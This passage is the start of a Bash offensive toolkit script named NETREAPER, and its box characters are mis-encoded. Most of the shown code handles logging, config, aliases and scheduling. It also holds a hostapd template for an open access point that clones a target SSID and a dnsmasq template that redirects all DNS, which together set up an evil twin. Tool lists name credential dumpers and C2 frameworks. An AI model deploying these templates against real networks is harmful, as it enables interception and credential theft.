#!/usr/bin/env bash
#â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
#
#    â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— 
#    â–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â•â•šâ•â•â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—
#    â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—     â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•
#    â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•     â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â• â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—
#    â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘
#    â•šâ•â•  â•šâ•â•â•â•â•šâ•â•â•â•â•â•â•   â•šâ•â•   â•šâ•â•  â•šâ•â•â•šâ•â•â•â•â•â•â•â•šâ•â•  â•šâ•â•â•šâ•â•     â•šâ•â•â•â•â•â•â•â•šâ•â•  â•šâ•â•
#
#    "Some tools scan. Some tools attack. I do both."
#
#    Author:  OFFTRACKMEDIA Studios
#    Version: 4.3.0 (Phantom)
#    License: MIT
#    
#    What happens when aircrack-ng and wifite have a baby,
#    disown it, and it comes back with a vengeance.
#
#â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

set -uo pipefail

QUIET=0
JSON_OUTPUT=0

readonly VERSION="4.3.0"
readonly CODENAME="Phantom"
readonly SCRIPT_NAME="netreaper"
# shellcheck disable=SC2034
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck disable=SC2034
readonly SCRIPT_DIR
readonly CONFIG_DIR="${HOME}/.netreaper"
readonly CONFIG_FILE="${CONFIG_DIR}/config"
readonly BASE_LOG_DIR="${CONFIG_DIR}/logs"
LOG_DIR="$BASE_LOG_DIR"
readonly BASE_OUTPUT_DIR="${CONFIG_DIR}/output"
readonly BASE_LOOT_DIR="${CONFIG_DIR}/loot"
OUTPUT_DIR="$BASE_OUTPUT_DIR"
LOOT_DIR="$BASE_LOOT_DIR"
readonly LEGAL_FILE="${CONFIG_DIR}/.legal_accepted"
readonly SESSION_FILE="${CONFIG_DIR}/.current_session"
readonly SESSIONS_DIR="${CONFIG_DIR}/sessions"
readonly HISTORY_FILE="${CONFIG_DIR}/history"
readonly FAVORITES_FILE="${CONFIG_DIR}/favorites"
readonly ALIASES_FILE="${CONFIG_DIR}/aliases"
readonly PROFILES_DIR="${CONFIG_DIR}/profiles"
CURRENT_SESSION=""
SESSION_NAME=""
readonly TMP_DIR="/tmp/netreaper"

DEFAULT_INTERFACE=""
DEFAULT_WORDLIST="/usr/share/wordlists/rockyou.txt"
DEFAULT_THEME="default"

# shellcheck disable=SC2016
HOSTAPD_TEMPLATE='interface=${IFACE}
driver=nl80211
ssid=${TARGET_SSID}
hw_mode=g
channel=${CHANNEL}
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0'

# shellcheck disable=SC2016
DNSMASQ_TEMPLATE='interface=${IFACE}
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
address=/#/192.168.1.1'

#â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# COLOR PALETTE - Blue/Red Team
#â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

if [[ -t 1 ]] && [[ "${NO_COLOR:-}" != "1" ]]; then
    readonly C_RESET=$'\033[0m'
    readonly C_BOLD=$'\033[1m'
    readonly C_DIM=$'\033[2m'

    readonly C_RED=$'\033[38;5;196m'
    readonly C_BLOOD=$'\033[38;5;124m'
    readonly C_FIRE=$'\033[38;5;202m'

    readonly C_BLUE=$'\033[38;5;39m'
    readonly C_CYAN=$'\033[38;5;51m'
    readonly C_STEEL=$'\033[38;5;67m'

    readonly C_GREEN=$'\033[38;5;46m'
    readonly C_YELLOW=$'\033[38;5;226m'
    readonly C_PURPLE=$'\033[38;5;135m'
    readonly C_ORANGE=$'\033[38;5;208m'

    readonly C_BORDER=$'\033[38;5;240m'
    readonly C_SHADOW=$'\033[38;5;244m'
    readonly C_GHOST=$'\033[38;5;250m'
    readonly C_WHITE=$'\033[38;5;255m'
else
    readonly C_RESET="" C_BOLD="" C_DIM=""
    readonly C_RED="" C_BLOOD="" C_FIRE=""
    readonly C_BLUE="" C_CYAN="" C_STEEL=""
    readonly C_GREEN="" C_YELLOW="" C_PURPLE="" C_ORANGE=""
    readonly C_BORDER="" C_SHADOW="" C_GHOST="" C_WHITE=""
fi

# shellcheck disable=SC2034
readonly C_SUCCESS="${C_GREEN}"
# shellcheck disable=SC2034
readonly C_ERROR="${C_RED}"
# shellcheck disable=SC2034
readonly C_WARNING="${C_YELLOW}"
# shellcheck disable=SC2034
readonly C_INFO="${C_CYAN}"
# shellcheck disable=SC2034
readonly C_PROMPT="${C_BLUE}"

# Legacy aliases to preserve existing styling
# shellcheck disable=SC2034
readonly C_VENOM="${C_GREEN}"
# shellcheck disable=SC2034
readonly C_SKULL="${C_WHITE}"
# shellcheck disable=SC2034
readonly C_GOLD="${C_ORANGE}"

#â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# TOOL ARSENAL - 60+ Capabilities
#â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

# shellcheck disable=SC2034
declare -a TOOLS_SCANNING=(nmap masscan unicornscan rustscan zmap netdiscover arp-scan fping hping3 p0f arping nbtscan amap)
# shellcheck disable=SC2034
declare -a TOOLS_DNS=(dnsenum dnsmap dnsrecon fierce)
# shellcheck disable=SC2034
declare -a TOOLS_SNMP=(onesixtyone snmpwalk snmpcheck)
# shellcheck disable=SC2034
declare -a TOOLS_SMB=(smbmap smbclient enum4linux)
declare -a TOOLS_SSL=(sslscan sslyze testssl.sh)
declare -a TOOLS_TRAFFIC=(tcpdump wireshark tshark ettercap bettercap)
declare -a TOOLS_WEB=(nikto wpscan sqlmap dirb gobuster ffuf burpsuite nuclei httpx subfinder amass)
declare -a TOOLS_WIFI=(aircrack-ng airmon-ng airodump-ng aireplay-ng wifite reaver bully pixiewps bettercap fluxion wifiphisher mdk3 mdk4 cowpatty)
declare -a TOOLS_EXPLOIT=(metasploit-framework searchsploit empire covenant crackmapexec)
declare -a TOOLS_CREDS=(hashcat john hydra medusa crackmapexec cowpatty)
declare -a TOOLS_POST=(impacket-secretsdump impacket-smbclient impacket-psexec impacket-wmiexec mimikatz)
declare -a TOOLS_OSINT=(theharvester recon-ng maltego shodan)
# shellcheck disable=SC2034
declare -a TOOLS_UTIL=(netcat ncat socat proxychains)

#â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# LOGGING
#â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

_log() {
    local level="${1:-}" color="${2:-}" symbol="${3:-}"
    shift 3
    local timestamp
    timestamp=$(date '+%H:%M:%S')
    local message="$*"
    if [[ "$JSON_OUTPUT" == "1" ]]; then
        local safe
        safe=${message//"/\\"}
        printf '{"level":"%s","time":"%s","message":"%s"}\n' "$level" "$timestamp" "$safe"
    elif [[ "$QUIET" -ne 1 ]]; then
        echo -e "${C_SHADOW}[${timestamp}]${C_RESET} ${color}${symbol}${C_RESET} $message"
    fi
    echo "[$(date -Iseconds)] [$level] $*" >> "${LOG_DIR}/netreaper.log" 2>/dev/null || true
}

log_info()    { _log "INFO"    "$C_GHOST"  "[*]" "$@"; }
log_success() { _log "SUCCESS" "$C_VENOM"  "[âœ“]" "$@"; }
log_warning() { _log "WARN"    "$C_FIRE"   "[!]" "$@"; }
log_error()   { _log "ERROR"   "$C_BLOOD"  "[âœ—]" "$@"; }
log_attack()  { _log "ATTACK"  "$C_BLOOD"  "[âš”]" "$@"; }
log_target()  { _log "TARGET"  "$C_FIRE"   "[â—]" "$@"; }
log_loot()    { _log "LOOT"    "$C_GOLD"   "[â˜…]" "$@"; }

#â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# PROGRESS & TIMING HELPERS
#â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

operation_header() {
    local mode="${1:-}" target="${2:-}"
    local started
    started=$(date '+%Y-%m-%d %H:%M:%S')
    log_info "[] NETREAPER v${VERSION} [] Target: ${target:-N/A} [] Mode: ${mode:-N/A} [] Starting at: ${started} â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€"
}

log_command_preview() {
    local cmd="$*"
    [[ "$QUIET" -eq 1 && "$JSON_OUTPUT" -ne 1 ]] && return
    log_info "Command: ${cmd}"
}

start_timer_ms() { date +%s%3N; }

format_duration_ms() {
    local ms="${1:-0}"
    awk "BEGIN {printf \"%.1f\", ${ms}/1000}"
}

operation_summary() {
    local label="${1:-}" start_ms="${2:-0}" outfile="${3:-}" extra="${4:-}"
    local duration_ms=$(( $(date +%s%3N) - start_ms ))
    local duration
    duration=$(format_duration_ms "$duration_ms")
    [[ "$QUIET" -eq 1 || "$JSON_OUTPUT" -eq 1 ]] || draw_line "â”€" 75
    log_success "${label} complete in ${duration}s"
    [[ -n "$outfile" ]] && log_info "Results saved: $outfile"
    [[ -n "$extra" ]] && log_info "$extra"
}

check_target_reachable() {
    local target="${1:-}"
    log_info "Checking target availability..."
    local ping_output latency
    if ping_output=$(ping -c 1 -W 2 "$target" 2>/dev/null); then
        latency=$(echo "$ping_output" | grep -o 'time=[0-9.]* ms' | head -n1 | cut -d'=' -f2)
        log_success "Target is up (latency: ${latency:-unknown})"
        return 0
    else
        log_warning "Target did not respond to ping"
        return 1
    fi
}

summarize_nmap_results() {
    local outfile="${1:-}"
    [[ -f "$outfile" ]] || return
    local open_ports
    open_ports=$(grep -Eo '^[0-9]+/(tcp|udp)[[:space:]]+open' "$outfile" | awk '{print $1}' | paste -sd ', ' -)
    [[ -z "$open_ports" ]] && open_ports="none"
    log_info "Open ports: ${open_ports}"
}

get_open_ports() {
    local outfile="${1:-}"
    [[ -f "$outfile" ]] || return
    local open_ports
    open_ports=$(grep -Eo '^[0-9]+/(tcp|udp)[[:space:]]+open' "$outfile" | awk '{print $1}' | paste -sd ', ' -)
    [[ -z "$open_ports" ]] && open_ports="none"
    printf '%s' "$open_ports"
}

#â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# VISUAL EFFECTS
#â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

typewriter() {
    local text="${1:-}" delay="${2:-0.015}"
    [[ "$QUIET" -eq 1 ]] && { echo "$text"; return; }
    for ((i=0; i<${#text}; i++)); do
        printf '%s' "${text:$i:1}"
        sleep "$delay"
    done
    echo
}

spinner() {
    local pid="${1:-}" msg="${2:-Processing}"
    [[ -z "$pid" ]] && return 1
    local frames=('â ‹' 'â ™' 'â ¹' 'â ¸' 'â ¼' 'â ´' 'â ¦' 'â §' 'â ‡' 'â ')
    local i=0
    tput civis 2>/dev/null || true
    while kill -0 "$pid" 2>/dev/null; do
        printf "\r    ${C_GHOST}%s${C_RESET} %s..." "${frames[$i]}" "$msg"
        i=$(( (i+1) % ${#frames[@]} ))
        sleep 0.08
    done
    printf "\r    ${C_VENOM}âœ“${C_RESET} %s      \n" "$msg"
    tput cnorm 2>/dev/null || true
}

progress_bar() {
    local current="${1:-0}" total="${2:-1}" width=40 label="${3:-}"
    local pct=$((current * 100 / total))
    local filled=$((current * width / total))
    local empty=$((width - filled))
    printf '\r    %s[%s' "$C_SHADOW" "$C_RESET"
    printf '%s%*s%s' "$C_VENOM" "$filled" "" "$C_RESET" | tr ' ' 'â–ˆ'
    printf '%s%*s%s' "$C_SHADOW" "$empty" "" "$C_RESET" | tr ' ' 'â–‘'
    printf '%s]%s %s%3d%%%s' "$C_SHADOW" "$C_RESET" "$C_SKULL" "$pct" "$C_RESET"
    [[ -n "$label" ]] && printf ' %s%s%s' "$C_DIM" "$label" "$C_RESET"
}

draw_line() {
    local char="${1:-â”€}" width="${2:-70}"
    printf '%*s\n' "$width" '' | tr ' ' "$char"
}

#â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# CONFIG & STATE
#â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

ensure_state_dirs() {
    mkdir -p "$CONFIG_DIR" "$LOG_DIR" "$OUTPUT_DIR" "$LOOT_DIR" "$SESSIONS_DIR" "$PROFILES_DIR"
    touch "$HISTORY_FILE" "$FAVORITES_FILE" "$ALIASES_FILE"
}

load_config() {
    ensure_state_dirs
    if [[ -f "$CONFIG_FILE" ]]; then
        while IFS='=' read -r key val; do
            [[ -z "$key" ]] && continue
            [[ "$key" =~ ^# ]] && continue
            case "$key" in
                DEFAULT_INTERFACE) DEFAULT_INTERFACE="$val" ;;
                WORDLIST) DEFAULT_WORDLIST="$val" ;;
                THEME) DEFAULT_THEME="$val" ;;
            esac
        done < "$CONFIG_FILE"
    fi
    DEFAULT_INTERFACE="${DEFAULT_INTERFACE:-wlan0}"
    DEFAULT_WORDLIST="${DEFAULT_WORDLIST:-/usr/share/wordlists/rockyou.txt}"
    DEFAULT_THEME="${DEFAULT_THEME:-default}"
}

cmd_config() {
    local action="${1:-edit}"
    ensure_state_dirs

    case "$action" in
        view)
            if [[ -f "$CONFIG_FILE" ]]; then
                log_info "Configuration (${CONFIG_FILE}):"
                sed 's/^/    /' "$CONFIG_FILE"
            else
                log_warning "No config found at ${CONFIG_FILE}"
            fi
            ;;
        edit|*)
            local editor="${EDITOR:-nano}"
            log_info "Opening config with ${editor}"
            "$editor" "$CONFIG_FILE"
            ;;
    esac
}

record_history() {
    local target="${1:-}"
    [[ -z "$target" ]] && return
    ensure_state_dirs
    local last
    last=$(tail -n1 "$HISTORY_FILE" 2>/dev/null || true)
    [[ "$last" == "$target" ]] && return
    echo "$target" >> "$HISTORY_FILE"
}

show_history() {
    ensure_state_dirs
    if [[ ! -s "$HISTORY_FILE" ]]; then
        log_warning "No history yet"
        return
    fi
    nl -ba "$HISTORY_FILE" | tail -n 20
}

add_favorite() {
    local name="${1:-}" target="${2:-}"
    ensure_state_dirs
    [[ -z "$name" || -z "$target" ]] && { log_error "Favorite name and target required"; return 1; }
    grep -v "^${name}:" "$FAVORITES_FILE" 2>/dev/null >"${FAVORITES_FILE}.tmp" || true
    mv "${FAVORITES_FILE}.tmp" "$FAVORITES_FILE"
    echo "${name}:${target}" >> "$FAVORITES_FILE"
    log_success "Favorite saved: ${name} -> ${target}"
}

list_favorites() {
    ensure_state_dirs
    if [[ ! -s "$FAVORITES_FILE" ]]; then
        log_warning "No favorites configured"
        return
    fi
    while IFS=':' read -r name target; do
        printf "    %s => %s\n" "$name" "$target"
    done < "$FAVORITES_FILE"
}

get_favorite() {
    local name="${1:-}"
    ensure_state_dirs
    grep -E "^${name}:" "$FAVORITES_FILE" 2>/dev/null | head -n1 | cut -d':' -f2-
}

resolve_target_alias() {
    local input="${1:-}"
    if [[ "$input" == "@last" ]]; then
        tail -n1 "$HISTORY_FILE" 2>/dev/null
        return
    fi
    if [[ "$input" =~ ^@fav:(.+)$ ]]; then
        get_favorite "${BASH_REMATCH[1]}"
        return
    fi
    echo "$input"
}

add_alias() {
    local name="${1:-}" body="${2:-}"
    ensure_state_dirs
    [[ -z "$name" || -z "$body" ]] && { log_error "Alias name and command required"; return 1; }
    grep -v "^${name}:" "$ALIASES_FILE" 2>/dev/null >"${ALIASES_FILE}.tmp" || true
    mv "${ALIASES_FILE}.tmp" "$ALIASES_FILE"
    echo "${name}:${body}" >> "$ALIASES_FILE"
    log_success "Alias added: ${name} -> ${body}"
}

list_aliases() {
    ensure_state_dirs
    if [[ ! -s "$ALIASES_FILE" ]]; then
        log_warning "No aliases defined"
        return
    fi
    while IFS=':' read -r name body; do
        printf "    %s => %s\n" "$name" "$body"
    done < "$ALIASES_FILE"
}

remove_alias() {
    local name="${1:-}"
    ensure_state_dirs
    grep -v "^${name}:" "$ALIASES_FILE" 2>/dev/null >"${ALIASES_FILE}.tmp" || true
    mv "${ALIASES_FILE}.tmp" "$ALIASES_FILE"
    log_success "Alias removed: $name"
}

expand_aliases() {
    local first="${1:-}"
    shift || true
    [[ -z "$first" ]] && return 1
    ensure_state_dirs
    local line
    line=$(grep -E "^${first}:" "$ALIASES_FILE" 2>/dev/null | head -n1)
    [[ -z "$line" ]] && return 1
    local body
    body=${line#*:}
    read -r -a EXPANDED_ARGS <<< "$body"
    EXPANDED_ARGS+=("$@")
    return 0
}

profile_save() {
    local name="${1:-}"; shift
    ensure_state_dirs
    [[ -z "$name" ]] && { log_error "Profile name required"; return 1; }
    mkdir -p "$PROFILES_DIR"
    printf '%s\n' "$*" > "${PROFILES_DIR}/${name}.profile"
    log_success "Profile saved: $name"
}

profile_load() {
    local name="${1:-}"
    [[ -f "${PROFILES_DIR}/${name}.profile" ]] || return 1
    cat "${PROFILES_DIR}/${name}.profile"
}

profile_list() {
    ensure_state_dirs
    find "$PROFILES_DIR" -maxdepth 1 -type f -name "*.profile" -print 2>/dev/null | sed 's#.*/##;s/\.profile$//' || true
}

discover_targets() {
    ensure_state_dirs
    local subnet="${1:-}"
    check_tool "nmap" || return 1
    if [[ -z "$subnet" ]]; then
        subnet=$(ip -o -f inet addr show | awk '/scope global/{print $4; exit}')
        subnet="${subnet:-192.168.1.0/24}"
    fi
    log_info "Discovering hosts on $subnet"
    local tmp
    tmp="${TMP_DIR}/discover_$(date +%s).log"
    mkdir -p "$TMP_DIR"
    nmap -sn "$subnet" | tee "$tmp"
    mapfile -t hosts < <(grep "Nmap scan report for" "$tmp" | awk '{print $5}' | sed 's/(//;s/)//')
    if [[ ${#hosts[@]} -eq 0 ]]; then
        log_warning "No hosts discovered"
        return 1
    fi
    echo
    local i=1
    for h in "${hosts[@]}"; do
        printf "    [%d] %s\n" "$i" "$h"
        i=$((i+1))
    done
    echo -ne "    ${C_FIRE}Select target (0=cancel): ${C_RESET}"
    read -r pick
    [[ "$pick" == "0" || -z "$pick" ]] && return 0
    local idx=$((pick-1))
    if (( idx < 0 || idx >= ${#hosts[@]} )); then
        log_error "Invalid selection"
        return 1
    fi
    TARGET="${hosts[$idx]}"
    record_history "$TARGET"
    log_success "Selected target: $TARGET"
    return 0
}

schedule_scan() {
    local action="${1:-}"; shift || true
    case "$action" in
        add)
            local spec="${1:-}"; shift
            local args="$*"
            [[ -z "$spec" || -z "$args" ]] && { log_error "Usage: schedule add \"CRON\" <netreaper args>"; return 1; }
            local bin_path
            bin_path=$(command -v "$SCRIPT_NAME" 2>/dev/null || true)
            bin_path="${bin_path:-${SCRIPT_DIR}/${SCRIPT_NAME}}"
            (crontab -l 2>/dev/null; echo "${spec} ${bin_path} ${args} >> ${LOG_DIR}/cron.log 2>&1") | crontab -
            log_success "Scheduled: ${spec} ${bin_path} ${args}"
            ;;
        list)
            crontab -l 2>/dev/null | grep "$SCRIPT_NAME" || log_warning "No scheduled scans"
            ;;
        clear)
            crontab -l 2>/dev/null | grep -v "$SCRIPT_NAME" | crontab -
            log_success "Cleared scheduled scans"
            ;;
        *)
            log_error "Usage: schedule [add|list|clear]"
            return 1
            ;;
    esac
}

diff_scans() {
    local file_a="${1:-}" file_b="${2:-}"
    [[ -z "$file_a" || -z "$file_b" ]] && { log_error "Usage: diff <file1> <file2>"; return 1; }
    [[ -f "$file_a" && -f "$file_b" ]] || { log_error "Both files must exist"; return 1; }
    diff -u "$file_a" "$file_b" | sed 's/^-/[ -]/;s/^+/[ +]/' || true
}

ensure_builtin_aliases() {
    ensure_state_dirs
    local builtin=("qs:scan --quick" "q:scan --quick" "full:scan --full" "stealth:scan --stealth" "vuln:scan --vuln")
    for entry in "${builtin[@]}"; do
        local name="${entry%%:*}" body="${entry#*:}"
        if ! grep -q "^${name}:" "$ALIASES_FILE" 2>/dev/null; then
            echo "${name}:${body}" >> "$ALIASES_FILE"
        fi
    done
}

favorite_cmd() {
    local action="${1:-}"; shift || true
    case "$action" in
        add) add_favorite "$1" "$2" ;;
        list) list_favorites ;;
        use)
            local fav
            fav=$(get_favorite "$1")
            [[ -z "$fav" ]] && { log_error "Favorite not found"; return 1; }
            echo "$fav"
            ;;
        *) log_error "Usage: favorite [add <name> <target>|list|use <name>]" ;;
    esac
}

alias_cmd() {
    local action="${1:-}"; shift || true
    case "$action" in
        add) add_alias "$1" "$*" ;;
        remove) remove_alias "$1" ;;
        list|ls) list_aliases ;;
        *) log_error "Usage: alias [add <name> <cmd>|remove <name>|list]" ;;
    esac
}

profile_cmd() {
    local action="${1:-}"; shift || true
    case "$action" in
        save) profile_save "$1" "$@" ;;
        load)
            local args
            args=$(profile_load "$1") || { log_error "Profile not found"; return 1; }
            echo "$args"
            ;;
        list|ls) profile_list ;;
        *) log_error "Usage: profile [save <name> <scan args>|load <name>|list]" ;;
    esac
}

discover_cmd() {
    local subnet="${1:-}"
    discover_targets "$subnet"
}

export_cmd() {
    local file="${1:-}" fmt="${2:-}"
    export_output "$file" "$fmt"
}

schedule_cmd() {
    local action="${1:-}"; shift || true
    schedule_scan "$action" "$@"
}

diff_cmd() {
    diff_scans "$1" "$2"
}

export_output() {
    local infile="${1:-}" format="${2:-}"
    [[ -z "$infile" || -z "$format" ]] && { log_error "Usage: export <file> <json|csv|html|md>"; return 1; }
    [[ -f "$infile" ]] || { log_error "File not found: $infile"; return 1; }
    local outfile="${infile%.*}.${format}"
    case "$format" in
        json)
            python3 - <<PY > "$outfile"
import json,sys
text=open("$infile","r",encoding="utf-8",errors="ignore").read().splitlines()
json.dump(text,sys.stdout,indent=2)
PY
            ;;
        csv)
            nl -ba "$infile" | awk -F"\t" '{print $1 "," $2}' > "$outfile"
            ;;
        html)
            {
                echo "<html><body><pre>"
                sed 's/&/\&amp;/g;s/</\&lt;/g;s/>/\&gt;/g' "$infile"
                echo "</pre></body></html>"
            } > "$outfile"
            ;;
        md)
            {
                echo '```'
                cat "$infile"
                echo '```'
            } > "$outfile"
            ;;
        *) log_error "Unknown format: $format"; return 1 ;;
    esac
    log_loot "Exported: $outfile"
}

check_for_update() {
    local latest
    latest=$(curl -fsSL "https://raw.githubusercontent.com/Nerds489/NETREAPER/main/VERSION" 2>/dev/null || true)
    if [[ -z "$latest" ]]; then
        log_warning "Could not check for updates"
        return 1
    fi
    if [[ "$latest" != "$VERSION" ]]; then
        log_info "Update available: ${latest} (current ${VERSION})"
        log_info "Run: wget https://raw.githubusercontent.com/Nerds489/NETREAPER/main/netreaper -O netreaper && chmod +x netreaper"
    else
        log_success "You are on the latest version (${VERSION})"
    fi
}

#â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# BANNER
#â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

show_banner() {
    clear
    echo -e "${C_RED}"
    cat << 'BANNER'
    
    â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
